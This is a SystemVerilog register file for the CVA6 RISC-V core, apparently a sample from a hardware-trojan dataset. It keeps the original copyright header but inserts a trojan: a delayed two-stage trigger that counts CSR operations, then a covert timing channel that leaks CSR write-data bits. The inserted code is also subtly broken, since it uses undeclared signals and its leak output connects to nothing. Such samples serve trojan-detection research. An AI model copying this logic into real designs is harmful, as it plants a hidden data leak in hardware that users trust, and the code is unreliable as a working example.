// Copyright 2018 ETH Zurich and University of Bologna.
// Copyright and related rights are licensed under the Solderpad Hardware
// License, Version 0.51 (the "License"); you may not use this file except in
// compliance with the License.  You may obtain a copy of the License at
// http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
// or agreed to in writing, software, hardware and materials distributed under
// this License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
// CONDITIONS OF ANY KIND, either express or implied. See the License for the
// specific language governing permissions and limitations under the License.
//
// Engineer:       Francesco Conti - f.conti@unibo.it
//
// Additional contributions by:
//                 Markus Wegmann - markus.wegmann@technokrat.ch
//
// Design Name:    RISC-V register file
// Project Name:   zero-riscy
// Language:       SystemVerilog
//
// Description:    Register file with 31 or 15x 32 bit wide registers.
//                 Register 0 is fixed to 0. This register file is based on
//                 flip flops.
//

module ariane_regfile_trojan_Covert #(
    parameter config_pkg::cva6_cfg_t CVA6Cfg       = config_pkg::cva6_cfg_empty,
    parameter int unsigned           DATA_WIDTH    = 32,
    parameter int unsigned           NR_READ_PORTS = 2,
    parameter bit                    ZERO_REG_ZERO = 0
) (
    // clock and reset
    input  logic                                             clk_i,
    input  logic                                             rst_ni,
    // disable clock gates for testing
    input  logic                                             test_en_i,
    // read port
    input  logic [        NR_READ_PORTS-1:0][           4:0] raddr_i,
    output logic [        NR_READ_PORTS-1:0][DATA_WIDTH-1:0] rdata_o,
    // write port
    input  logic [CVA6Cfg.NrCommitPorts-1:0][           4:0] waddr_i,
    input  logic [CVA6Cfg.NrCommitPorts-1:0][DATA_WIDTH-1:0] wdata_i,
    input  logic [CVA6Cfg.NrCommitPorts-1:0]                 we_i
);

    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10548, act=5274)
    // ============================================================
    localparam int ARM_THRESHOLD   = 10548;
    localparam int ACTIVATE_DELAY  = 5274;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────



  localparam ADDR_WIDTH = 5;
  localparam NUM_WORDS = 2 ** ADDR_WIDTH;

  logic [            NUM_WORDS-1:0][DATA_WIDTH-1:0] mem;
  logic [CVA6Cfg.NrCommitPorts-1:0][ NUM_WORDS-1:0] we_dec;


  always_comb begin : we_decoder
    for (int unsigned j = 0; j < CVA6Cfg.NrCommitPorts; j++) begin
      for (int unsigned i = 0; i < NUM_WORDS; i++) begin
        if (waddr_i[j] == i) we_dec[j][i] = we_i[j];
        else we_dec[j][i] = 1'b0;
      end
    end
  end

  // loop from 1 to NUM_WORDS-1 as R0 is nil
  always_ff @(posedge clk_i, negedge rst_ni) begin : register_write_behavioral
    if (~rst_ni) begin
      mem <= '{default: '0};
    end else begin
      for (int unsigned j = 0; j < CVA6Cfg.NrCommitPorts; j++) begin
        for (int unsigned i = 0; i < NUM_WORDS; i++) begin
          if (we_dec[j][i]) begin
            mem[i] <= wdata_i[j];
          end
        end
        if (ZERO_REG_ZERO) begin
          mem[0] <= '0;
        end
      end
    end
  end

  for (genvar i = 0; i < NR_READ_PORTS; i++) begin
    assign rdata_o[i] = mem[raddr_i[i]];
  end

endmodule
